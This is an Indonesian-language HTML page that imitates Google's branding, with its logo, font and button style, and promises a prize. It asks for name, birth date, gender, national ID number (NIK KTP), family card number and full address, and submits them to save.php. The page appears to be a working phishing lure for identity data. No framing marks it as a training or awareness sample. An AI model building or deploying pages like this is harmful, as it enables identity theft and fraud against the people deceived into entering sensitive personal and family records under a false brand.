<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <!-- Tambahkan viewport meta tag untuk responsive -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Data Diri</title>
    <style>
        /* CSS Responsive */
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #fff;
            color: #202124;
            min-height: 100vh;
            box-sizing: border-box;
        }
        
        .container {
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
        }

        .google-logo {
            width: 30vw;
            max-width: 150px;
            margin: 0 auto 20px;
            display: block;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 500;
            margin-bottom: 15px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        input, select, textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 1rem;
            margin-top: 8px;
            box-sizing: border-box;
        }

        .info-text {
            color: #5f6368;
            font-size: 0.8rem;
            margin-top: 5px;
        }

        .next-btn {
            background: #1a73e8;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 1rem;
            margin-top: 15px;
        }

        /* Media Query untuk Mobile */
        @media (max-width: 768px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 1.3rem;
            }
            
            input, select {
                padding: 10px;
                font-size: 0.9rem;
            }
        }

        @media (max-width: 480px) {
            .google-logo {
                width: 40vw;
            }
            
            .info-text {
                font-size: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
        
        <h1>Form Pengguna</h1>
        <p style="color: #5f6368; text-align: center; margin-bottom: 25px;">Untuk mendapatkan hadiah isi data berikut</p>

        <form action="save.php" method="POST">
            <!-- Data Pribadi -->
            <div class="form-group">
                <input type="text" name="nama_depan" placeholder="Nama Depan" required>
                <div class="info-text">Untuk identifikasi nama pengguna</div>
            </div>

            <div class="form-group">
                <input type="text" name="nama_belakang" placeholder="Nama Belakang" required>
                <div class="info-text">Untuk identifikasi nama pengguna</div>
            </div>

            <div class="form-group">
                <input type="date" name="tanggal_lahir" required>
                <div class="info-text">Verifikasi usia</div>
            </div>

            <div class="form-group">
                <select name="gender" required>
                    <option value="">Jenis Kelamin</option>
                    <option value="L">Laki-laki</option>
                    <option value="P">Perempuan</option>
                </select>
                <div class="info-text">Verifikasi gender</div>
            </div>

            <!-- Data Sensitif -->
            <div class="form-group">
                <input type="number" name="nik_ktp" placeholder="NIK KTP" required>
                <div class="info-text">Verifikasi kependudukan Dukcapil</div>
            </div>

            <div class="form-group">
                <input type="number" name="nik_kk" placeholder="NIK Kartu Keluarga" required>
                <div class="info-text">Verifikasi hubungan keluarga</div>
            </div>

            <div class="form-group">
                <input type="text" name="alamat" placeholder="Alamat Lengkap" required>
                <div class="info-text">Untuk pengiriman hadiah</div>
            </div>

            <button type="submit" class="next-btn">Kirim</button>
        </form>
    </div>
</body>
</html>